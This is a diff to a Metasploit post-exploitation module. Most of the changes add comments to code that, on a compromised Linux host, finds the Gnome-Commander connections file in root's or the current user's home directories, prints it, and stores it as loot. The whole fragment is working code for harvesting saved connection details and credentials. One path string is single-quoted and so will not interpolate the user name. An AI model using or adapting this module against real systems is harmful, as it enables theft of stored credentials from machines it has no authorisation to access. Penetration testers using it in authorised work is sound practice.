@@ -22,23 +22,30 @@ class Metasploit3 < Msf::Post
 
   def run
     user_dirs = []
+    # Search current user
     user = cmd_exec("whoami").chomp
-    if (user == 'root')
+    # User is root
+    if user == 'root'
        print_status("Current user is #{user}, probing all home dirs")
        user_dirs << '/root'
+       # Search home dirs
        cmd_exec('ls /home').each_line.map { |l| user_dirs << "/home/#{l}".chomp }
     else
+       # Non root user
        print_status("Current user is #{user}, probing /home/#{user}")
        user_dirs << '/home/#{user}'
     end
     # Try to find connections file in users homes
     user_dirs.each do |dir|
+      # gnome-commander connections file
       connections_file = "#{dir}/.gnome-commander/connections"
       if file?(connections_file)
+        #File exists
         begin
           str_file=read_file(connections_file)
           print_good("File found : #{connections_file}")
           vprint_line(str_file)
+          #Store file
           p = store_loot("connections", "text/plain", session, str_file, connections_file, "Gnome-Commander connections")
           print_good ("Connections file saved to #{p}")
         rescue EOFError
